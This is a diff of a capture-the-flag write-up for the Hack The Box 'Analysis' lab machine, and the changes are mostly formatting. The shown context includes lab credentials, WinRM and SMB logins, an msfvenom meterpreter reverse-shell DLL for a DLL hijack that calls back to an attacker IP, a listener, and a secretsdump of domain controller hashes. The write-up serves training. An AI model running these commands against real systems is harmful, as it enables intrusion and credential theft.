@@ -1,5 +1,5 @@
 ---
-date: 2025-03-16
+date: 2025-05-02
 categories: [CTF, HTB]
 title: "HTB - Analysis"
 tags: ['gobuster', 'impacket', 'ldap', 'linux', 'nmap', 'powershell', 'privilege escalation', 'python', 'rce', 'reverse shell', 'secretsdump', 'smb', 'sqli', 'windows']
@@ -60,11 +60,13 @@ gobuster dns -d analysis.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top
 ![image6](../resources/cf8f40b31f754d43a9564afae8074d7f.png)
 
 - Good wordlist for extensions:
+
 ```bash
 /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt
 
 ```
 - Search for extensions:
+
 ```bash
 dirsearch -u http://internal.analysis.htb/users -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -r -t 50
 ```
@@ -234,6 +236,7 @@ And it uploaded:
 ![image29](../resources/7738db7319d44994ae51903d8a291a2e.png)
 
 - Set up a listener:
+
 ```bash
 rlwrap -cAr nc -lvnp 4445
 
@@ -279,16 +282,18 @@ So I got a Powershell reverse shell \#2 from revshells:
 **jdoe : 7y4Z4^\*y9Zzj**
 
 - Test the credentials with CME:
+
 ```bash
-crackmapexec smb analysis.htb -u jdoe -p 7y4Z4^\*y9Zzj
+crackmapexec smb analysis.htb -u jdoe -p 7y4Z4^*y9Zzj
 
 ```
 
 ![image38](../resources/7b0b0f8b5a4f4bb99184c3498e53c9b2.png)
 
 - Get a shell:
+
 ```bash
-evil-winrm -i analysis.htb -u jdoe -p "7y4Z4^\*y9Zzj"
+evil-winrm -i analysis.htb -u jdoe -p "7y4Z4^*y9Zzj"
 
 ```
 
@@ -322,6 +327,7 @@ As it says that it calls on the dll file - **sf_engine.dll**
 - But it isn't in the **snort_dynamicpreprocessor** dir
 
 - We have write permissions for this folder:
+
 ```bash
 icacls snort_dynamicpreprocessor
 
@@ -332,11 +338,13 @@ icacls snort_dynamicpreprocessor
 - We can leverage this by uploading our own dll file into this directory and wait for it to be loaded
 
 - Create a malicious dll:
+
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.84 LPORT=4444 -f dll -o sf_engine.dll
 
 ```
 - Start listener:
+
 ```bash
 msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.84; set lport 4444; exploit"
 
@@ -613,6 +621,7 @@ WSmith has ForceChangePassword on SOC_Analyst which has GenericAll to Domain Adm
 ![image86](../resources/6b691ec1efa3445ca5272aa7850c7812.png)
 
 - Now we can dump the hashes from the DC:
+
 ```bash
 impacket-secretsdump soc_analyst:'Password123!'@10.129.242.35 -dc-ip 10.129.242.35
 
